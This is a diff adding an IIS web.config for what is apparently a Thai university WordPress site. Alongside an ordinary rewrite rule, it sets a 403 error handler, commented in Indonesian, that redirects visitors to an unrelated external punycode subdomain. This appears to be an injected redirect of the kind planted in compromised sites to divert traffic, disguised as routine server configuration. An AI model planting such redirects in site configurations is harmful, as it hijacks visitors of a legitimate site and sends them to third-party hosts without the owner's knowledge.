@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+  <system.webServer>
+  
+    <!-- Redirect otomatis kalau ada error 403 -->
+    <httpErrors errorMode="Custom">
+      <remove statusCode="403" />
+      <error statusCode="403" path="https://xn--12ca2dbc1f9gc3nd.lazismumedankota.org/403.html" responseMode="Redirect" />
+    </httpErrors>
+
+    <rewrite>
+      <rules>
+        <rule name="WordPress: https://oet.stou.ac.th" patternSyntax="Wildcard">
+          <match url="*" />
+          <conditions>
+            <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
+            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
+          </conditions>
+          <action type="Rewrite" url="index.php" />
+        </rule>
+      </rules>
+    </rewrite>
+  </system.webServer>
+</configuration>
